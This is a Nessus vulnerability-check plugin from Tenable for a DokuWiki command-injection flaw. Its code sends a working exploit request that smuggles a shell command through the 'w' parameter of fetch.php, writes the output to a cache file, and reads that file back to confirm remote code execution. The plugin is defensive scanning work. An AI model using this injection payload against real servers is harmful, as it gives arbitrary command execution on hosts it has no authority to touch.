#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by
multiple vulnerabilities. 

Description :

The remote host is running DokuWiki, an open-source wiki application
written in PHP. 

The installed version of DokuWiki fails to properly sanitize input to
the 'w' and 'h' parameters of the 'lib/exe/fetch.php' script before
using it to execute a command when resizing images.  An
unauthenticated attacker can leverage this issue to execute arbitrary
code on the remote host subject to the privileges of the web server
user id. 

In addition, the application reportedly does not limit the size of
images when resizing them, which can be exploited to churn through CPU
cycles and disk space on the affected host. 

Note that successful exploitation of this issue requires that
DokuWiki's 'imconvert' configuration option be set; by default, it is
not. 

See also :

http://bugs.splitbrain.org/?do=details&id=924
http://bugs.splitbrain.org/?do=details&id=926
http://www.freelists.org/archives/dokuwiki/09-2006/msg00278.html

Solution :

Upgrade to DokuWiki release 2006-03-09e / 2006-09-28 or later. 

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(22475);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(20257);

  script_name(english:"DokuWiki im_convert Arbitrary Code Execution Vulnerability");
  script_summary(english:"Executes arbitrary command via DocuWiki im_convert Feature");
 
  script_description(english:desc);

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/doku", "/dokuwiki", "/wiki", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to run a command.
  cmd = "id";
  fname = string(SCRIPT_NAME, "-", unixtime(), ".html");
  req = http_get(
    item:string(
      dir, "/lib/exe/fetch.php?",
      "media=wiki:dokuwiki-128.png&",
      "w=1;", cmd, ">../../data/cache/", fname, ";exit;"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it looks like the exploit was successful...
  if (" bad permissions?" >< res)
  {
    # Retrieve the output of the command.
    req = http_get(item:string(dir, "/data/cache/", fname), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if the output looks like it's from id.
    if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
    {
      if (report_verbosity)
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote host,\n",
          "which produced the following output :\n",
          "\n",
          res
        );
      else report = desc;

      security_hole(port:port, data:report);
      exit(0);
    }
  }
}
